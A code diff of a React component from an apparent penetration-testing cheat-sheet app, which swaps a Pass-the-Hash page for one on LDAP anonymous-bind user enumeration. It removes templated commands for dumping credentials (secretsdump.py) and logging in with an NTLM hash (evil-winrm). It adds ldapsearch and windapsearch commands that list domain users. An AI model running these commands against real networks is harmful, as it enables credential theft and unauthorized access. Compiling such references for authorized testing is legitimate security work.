@@ -13,7 +13,7 @@ interface IProps {
   title: string;
 }
 
-const PassTheHash = ({ title }: IProps) => {
+const GetUserswithLDAPAnonymousBind = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -35,30 +35,22 @@ const PassTheHash = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              A Pass-the-Hash (PtH) attack is a technique whereby an attacker
-              captures a password hash (as opposed to the password characters)
-              and then simply passes it through for authentication and
-              potentially lateral access to other networked systems. The threat
-              actor doesn’t need to decrypt the hash to obtain a plain text
-              password. Note: PtH is not possible with NTLMv2. NTLM has been
-              succeeded by NTLMv2, which is a hardened version of the original
-              NTLM protocol. NTLMv2 includes a time-based response, which makes
-              simple pass the hash attacks impossible.
+              LDAP anonymous binds allow unauthenticated attackers to retrieve
+              information from the domain, such as a complete listing of users,
+              groups, computers, user account attributes, and the domain
+              passwrord policy.
             </Typography>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 1</Typography>
-            <Typography>
-              This step is not needed, if you have obtained the NTLM hash other
-              way, then you can go straight to step 2. This step is just a
-              common way to dump credentials.
-            </Typography>
+            <Typography variant="h6">Option 1 - ldapsearch</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"secretsdump.py {DOMAIN}/{USER}@{IP}"}
+              {
+                'ldapsearch -h {IP} -x -b "DC={DC},DC={DC}" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "'
+              }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 2</Typography>
+            <Typography variant="h6">Option 2 - windapsearch</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"evil-winrm -H {NTLM_HASH} -u administrator -i {IP}"}
+              {'./windapsearch.py --dc-ip {IP} -u "" -U'}
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -67,4 +59,4 @@ const PassTheHash = ({ title }: IProps) => {
   );
 };
 
-export default PassTheHash;
+export default GetUserswithLDAPAnonymousBind;
